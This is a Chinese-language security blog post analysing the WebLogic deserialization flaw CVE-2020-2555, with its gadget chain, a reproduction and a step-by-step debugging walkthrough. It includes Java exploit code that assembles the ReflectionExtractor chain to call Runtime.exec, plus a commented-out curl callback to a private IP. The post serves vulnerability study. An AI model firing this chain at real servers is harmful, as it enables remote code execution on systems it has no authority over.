<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/r_773o_sk8YLKN1ejegugQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xf7eiaxtpK6Y6q8OVAJt7Xp8TkUNAfkM647xlwo5A9j15ZawBMSibPh1yw/640?wx_fmt=jpeg)

**原理**

### **（一）概述**

不安全的反序列化漏洞已成为针对 Java Web 应用程序的研究者的普遍目标。这些漏洞通常会导致 RCE，并且通常不容易彻完全修补。CVE-2020-2555 就属于这一类。

针对 CVE-2015-4852 的补丁的绕过有两种大思路，一是寻找新的可以实现任意代码执行的类，二是换可触发利用链的反序列化点（包括换接收输入的点和换到包装类的内部）。之前的绕过基本上都是第二种，这里主要是第一种，在选择的类上直接另立门户。

### **（二）CVE-2020-2555**

CVE-2020-2555 也是反序列化漏洞，其内部的原理不很是很复杂，却非常值得学习。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfvwf07Edlwfts1oXYmjFAb9zR1iciczAva1ZncCFApiaAgoBajHdNXGVvA/640?wx_fmt=png)

前面讲过一个故事，现在接着往下编。那个小孩子觉得药都不好吃，于是闹着不想吃药（有了新补丁），医生干脆放弃吃药（找不到新的包装类了），转为输液治疗（CVE-2017-3248），但是小孩子觉得输液会疼，又不想输液，于是医生找了一种甜的药（CVE-2020-2555），用来治病（getshell）。

### **（三）原理**

1. 原理

清水川崎原文链接（点击 “阅读原文” 查看链接）

ReflectionExtractor 内有 method.invoke()，可以用于执行任意方法，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfmag9w5wD0lGYRsovTMBGk9SGdUUHJpRVLo8kp2oBZMMVsqBtCYluOg/640?wx_fmt=png)

通过构造链式的 ChainedExtractor 就可以实现任意代码执行。LimitFilter 中的 toString() 方法会调用 m_extractor 的 extract()，而 BadAttributeValueExpException 的 readObject() 中可以调用其成员变量的 toString()。

由此一来，我们可以构造 BadAttributeValueExpException 的 val 为 LimitFilter 对象，这个对象的 m_extractor 为内部成链的 chainedExtractor，和上面一段的描述逆序执行，最终触发 RCE。

2. 工具分析

这里用 Y4er 师傅的 PoC，将 CVE_2020_2555.java 添加到 weblogic_cmd 中。

Y4er 师傅 PoC 链接（点击 “阅读原文” 查看链接）

择要展示一下代码。

先是按顺序构造 ChainedExtractor，

```
// Runtime.class.getRuntime()
ReflectionExtractor extractor1 = new ReflectionExtractor(
        "getMethod",
        new Object[]{"getRuntime", new Class[0]}
);

// get invoke() to execute exec()
ReflectionExtractor extractor2 = new ReflectionExtractor(
        "invoke",
        new Object[]{null, new Object[0]}
);

// invoke("exec","calc")
ReflectionExtractor extractor3 = new ReflectionExtractor(
        "exec",
        new Object[]{new String[]{"calc"\}\}
        //new Object[]{new String[]{"/bin/bash", "-c", "curl http://172.16.1.1/success"\}\}
);

ReflectionExtractor[] extractors = {
        extractor1,
        extractor2,
        extractor3,
};
ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);

```

再是封装进 LimitFilter 对象，

```
LimitFilter limitFilter = new LimitFilter();

//m_comparator
Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
m_comparator.setAccessible(true);
m_comparator.set(limitFilter, chainedExtractor);

//m_oAnchorTop
Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
m_oAnchorTop.setAccessible(true);
m_oAnchorTop.set(limitFilter, Runtime.class);

```

接下来将其封装进 BadAttributeValueExpException，

```
BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
field.setAccessible(true);
field.set(badAttributeValueExpException, limitFilter);

```

看到这里，我回想起了 CVE-2016-3510 中用到的 CC1 链，相似度可谓非常高了，CC1 中的 InvokerTransformer 也有 method.invoke()，几个 Transformer 封装成了 ChainedTransformer，再封装进可以对成员变量调用 readObject() 的类，最终发送出去。

整个链的构造如出一辙，不一样的就是换了反序列化点，CVE-2016-3510 中 readObject 便算是完成了任务，而 CVE-2020-2555 中则是再通过 toString 进入另一层面。

**调试**

### **（一）环境搭建**

版本与之前不同了，漏洞用到的 UniversalExtractor 是 WebLogic 12.2.1.4.0 所特有的，而 vulhub\weblogic 均是 10.3.6 版本的，搭建相应的 docker 也需要下载相应的 jar，可直接搭在本机上。

### **（二）复现**

运行 PoC，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfMJxKl0tuu7ZILpGMFTvo7ZNlXE6sqEh3JbO7leKdED0QyicODzfsL0Q/640?wx_fmt=png)

弹出计算器，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfQicBawtghV7Vh65MmMsvXU3rCEY4ZhDiaSa1ua4oXplicQrKx7lNxxt4A/640?wx_fmt=png)

### **（三）调试**

先上调用栈，

```
extract:121, ReflectionExtractor (com.tangosol.util.extractor)
extract:105, ChainedExtractor (com.tangosol.util.extractor)
toString:599, LimitFilter (com.tangosol.util.filter)
readObject:86, BadAttributeValueExpException (javax.management)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1158, ObjectStreamClass (java.io)
readSerialData:2173, ObjectInputStream (java.io)
readOrdinaryObject:2064, ObjectInputStream (java.io)
readObject0:1568, ObjectInputStream (java.io)
readObject:428, ObjectInputStream (java.io)
readObject:73, InboundMsgAbbrev (weblogic.rjvm)
read:45, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:325, MsgAbbrevJVMConnection (weblogic.rjvm)
init:219, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:557, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:666, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:397, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:993, SocketMuxer (weblogic.socket)
readReadySocket:929, SocketMuxer (weblogic.socket)
process:599, NIOSocketMuxer (weblogic.socket)
processSockets:563, NIOSocketMuxer (weblogic.socket)
run:30, SocketReaderRequest (weblogic.socket)
execute:43, SocketReaderRequest (weblogic.socket)
execute:147, ExecuteThread (weblogic.kernel)
run:119, ExecuteThread (weblogic.kernel)

```

PoC 打过去，断下，

一开始先是 BadAttributeValueExpException 对象的 readObject，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xf2U9l2oB0eEuyjXGxuGjNBxIbb3EPb1jNu6Tf6AxJ7Q7uNGV69tL1ag/640?wx_fmt=png)

这里的 val 对应 PoC 中这几行代码，

```
BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
field.setAccessible(true);
field.set(badAttributeValueExpException, limitFilter);

```

因为我是在本地调试，有时候想看什么结果就会在调试器内部执行完恶意代码，就会弹出计算器，不是什么大问题。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfnBjL7aoAZ6cqjNBayaEdjGiaOnN3rEtmw7FibZXdzUfDiaw9D3NZziazxw/640?wx_fmt=png)

接下来，进入 LimitFilter 的 toString()，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfnFeibomRpp3aADibPgJEwmjLch3J735Fnicmq1rm1gvJqDiba3zK7oKT5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfwf0JhFLHX70JuXf6cbs2THyYibJby7Kic6apx6FaQGttmAvWUadtuSTw/640?wx_fmt=png)

这里关键的变量我们都已经控制好了，比如这里的 m_comparator，此时的 m_extractor 为 ChainedExtractor。  
跟进它的 extract，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfWRhbAXgGOxxib5Sn3hzayN5DUCibVUjh5OQ0NKcSGVYuEwLIDZqOOgww/640?wx_fmt=png)

其内部 extract 会调用每个元素的 extract，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfPa4xMeXIrPtHt9LTgkibqYAp99icJNmV1cXfWiabxRASdj8k8vgO4YSIg/640?wx_fmt=png)

与 ChainedTransformer 的 transform 相似度极高，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfksgzhKAkcIhJQ5VXzH8C1RzIhYx0xiaYczNmjJbx4N7riafIu7llicRCQ/640?wx_fmt=png)

进入第 0 个 extractor 的 extract，从这里不难看出为什么 oTarget 要是个 java.lang.Runtime，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfzJFKlmhpDeGtNByhGwn2qLQ59Ug6ZNMc9aZ8LFy2ETsHrJLvfZYHuQ/640?wx_fmt=png)

但是第一次调试时我产生了疑惑，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfmlTkK9UrKicomp9s6ZxTbQ848dxhaVPmym2BlUMSRjtpcv7nkKdr4ibQ/640?wx_fmt=png)

为什么 m_methodPrev 是个非空值，

下图为调试 PoC 时，ChainedExtractor 构造好时的结果，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xf7rUd0kotiaF4RDeexgpAak8Cicl67HUXjmrzjnruNSmb052Dibr8icAxicQ/640?wx_fmt=png)

既然 attacker 构造时是空，那么为什么在 victim 上是个非空值呢？

我们先继续调 PoC，经调试发现，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfp6xDGzgrb1LrSqaDFcibpkXIzricSopFCozW0ict7UIXRPzaxBUAPMjcQ/640?wx_fmt=png)

执行完这一行代码之后，m_methodPrev 的值就会改变，

我们先跟进之，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfDSVEn3Qj7AVhSXvAn6dwneMofdFCjmtWicPicbibavsGkcKhyXDSE356g/640?wx_fmt=png)

可以看到，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfjHmavlRmsHKHsqORIWiaT2XHJ3dcJ6LSwqTqClrho7Fyk4EaTQ71QBw/640?wx_fmt=png)

在执行 getFieldAccessor(obj).set(obj, value); 之前，m_methodPrev 的值都没有改变，问题的范围又得到了缩小，  
继续跟进，进入 UnsafeObjectFieldAccessorImpl 的 set，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfkibI3Bqqlr6icG0iabs2y31UCZZOMRWHiaHmFECmBfF9uXae2L2DYOec3g/640?wx_fmt=png)

就在上图断点这一行，执行完，m_methodPrev 的值就会改变，但是再想深入跟就跟进不了了。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfO5JtevicSw4HkEqcBOz5lQpN5aqlROI4LjbReOHyukfzEronUUtjLAw/640?wx_fmt=png)

下面回到调试 WLS，这一部分比较熟悉了，前面也见过，  
进入第一个 ReflectionExtractor，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xf8mnoxSM11qLicm8icMfXLercOShTul7BCeE6KyI9OlsYZJk485w3Ppaw/640?wx_fmt=png)

获得 Runtime 实例，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfic68tLbN7lWBdsJAfvhaSJwAPD8ZnS8ib0DfAIDv5nricTSJHtKMmnyug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xftcaVKO1J8iaYMszfRE0yOG5c9CDuMLpwRDIobybt2OPAjZ67Jy8kfpg/640?wx_fmt=png)

第二个 ReflectionExtractor，

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfyVicoZKT1D1pmCicYfwTJ49FSYibnTysOYW3Wa52ONNicA8zehqP6jsBHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xfHZ3vkPQQy8sBy3217fh6hcWLOcpo7szFyic3icXPe2mVwhib85N7Mjib5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5j6w7dyB0jP2XHgVRs21xf7ibqr1YOvk85Yurqte5zyRw78CVrfCpjMaLazaHHbbqicq7AsgCMC04g/640?wx_fmt=png)

**收获与启示**

因为我是先学习了 CVE-2015-4852 和 CVE-2020-14645 之后再学习的这个 CVE，感觉这像是一个承前启后的漏洞。首先，前承了 CVE-2015-4852 的攻击链的思路，其次，又开启了后面的对 Extractor 的利用的篇章。

整个利用链条和 CVE-2020-14645 比起来相对简单，但其中不乏有相似之处和值得研究的细节，学习完后有所收获，比如一个新名词 sink，  
Sinks 即可能会有副作用的 Java 方法，常见的有：

FileOutputStream.write() 可造成任意文件写；  
Runtime.exec() 可造成任意代码执行；  
Method.invoke() 可造成任意方法调用。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)
----------------------------------------------------------------------------------------------------------------------------------------------

  

- End -  

精彩推荐

[纵横杯线上初赛部分题解](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737447&idx=1&sn=0891747d7718b1db6e20ed378fd12a2d&chksm=888cf888bffb719ef262466c6b9fd34dac6377cd4efd303dd7e9b8da30dd60d66572f515fb6d&scene=21#wechat_redirect)  

[越南已经成为复杂供应链攻击的主要目标](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737407&idx=1&sn=e22caa66b5e464df0235fe4241867b67&chksm=888cf8d0bffb71c631894ab899988a15dee8018116dffa2c557b8de5356a07c9a1169d9821fb&scene=21#wechat_redirect)  

[芬兰议会称议员邮箱遭黑客入侵](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737406&idx=1&sn=525fdc25525e80a0e0c7086befed67bb&chksm=888cf8d1bffb71c7c38f955127956ab208f18b2977bab0ec2f2cfde6ae7901ccc8aae595e704&scene=21#wechat_redirect)  

[34c3ctf-v9](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737386&idx=1&sn=4401d63b0c998c1c71bc41791072dfdc&chksm=888cf8c5bffb71d3bac403e2758dd80fb16f56dd4a4d7541c74b12958ac43279ed36b53ac16a&scene=21#wechat_redirect)

  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

---------------------------------------------------------------------------------------------------------------------------------------------------

**戳 “阅读原文” 查看更多内容**